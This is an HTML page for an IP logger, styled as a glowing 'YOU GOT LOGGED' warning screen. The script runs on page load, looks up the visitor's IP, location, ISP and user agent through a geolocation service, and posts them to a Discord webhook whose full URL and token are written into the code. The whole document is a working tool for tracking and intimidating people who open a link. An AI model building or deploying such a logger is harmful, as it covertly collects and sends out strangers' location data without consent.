<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Warning</title>
    <style>
        /* 1. Page Setup */
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* 2. White Glowy Text Styling */
        .status-text {
            font-size: 3.5rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 8px;
            color: #fff;
            /* Layered shadows for intense glow */
            text-shadow: 
                0 0 5px #fff, 
                0 0 10px #fff, 
                0 0 20px #fff, 
                0 0 40px #fff;
            margin-bottom: 10px;
            text-align: center;
            animation: flicker 2s infinite;
        }

        .info-box {
            font-size: 1.1rem;
            color: #888;
            margin-bottom: 40px;
            text-align: center;
            text-transform: uppercase;
        }

        #ip, #country {
            color: #fff;
            font-weight: bold;
        }

        /* 3. Waving Flag Styling */
        .flag-container {
            margin-top: 20px;
            display: inline-block;
            animation: wave 2.5s ease-in-out infinite;
        }

        .flag-container img {
            width: 180px;
            border-radius: 4px;
            /* Makes the flag glow white too */
            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.8));
        }

        /* 4. Animations */
        @keyframes wave {
            0%, 100% { transform: rotate(-5deg) translateY(0) scale(1); }
            50% { transform: rotate(5deg) translateY(-15px) scale(1.05); }
        }

        @keyframes flicker {
            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
            20%, 22%, 24%, 55% { opacity: 0.5; }
        }
    </style>
</head>
<body>

    <div class="status-text">YOU GOT LOGGED</div>
    
    <div class="info-box">
        <p>ADDRESS: <span id="ip">TRACKING...</span></p>
        <p>ORIGIN: <span id="country">LOCATING...</span></p>
    </div>

    <div id="flag" class="flag-container"></div>

    <script>
        // Replace with your current webhook
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function initLogger() {
            try {
                // 1. Get Data from IPAPI
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Update UI
                document.getElementById('ip').innerText = data.ip;
                document.getElementById('country').innerText = data.country_name;
                
                // 3. Insert Flag Image (Fix for Windows Emoji bug)
                if (data.country_code) {
                    const code = data.country_code.toLowerCase();
                    document.getElementById('flag').innerHTML = `
                        <img src="https://flagcdn.com/w320/${code}.png" alt="User Flag">
                    `;
                }

                // 4. Send Webhook to Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "ðŸš¨ SCRIPT EXECUTED: TARGET LOGGED",
                            color: 0, // Pure Black
                            fields: [
                                { name: "IP Address", value: `\`${data.ip}\``, inline: true },
                                { name: "Country", value: `${data.country_name} (${data.country_code})`, inline: true },
                                { name: "City/Region", value: `${data.city}, ${data.region}`, inline: true },
                                { name: "ISP", value: data.org, inline: false },
                                { name: "User Agent", value: navigator.userAgent, inline: false }
                            ],
                            footer: { text: "Logger developed by @cc.comp" },
                            timestamp: new Date()
                        }]
                    })
                });

            } catch (err) {
                console.error("Logger failed:", err);
                document.getElementById('ip').innerText = "ERROR_FETCH_FAILED";
            }
        }

        // Run on load
        window.onload = initLogger;
    </script>
</body>
</html>
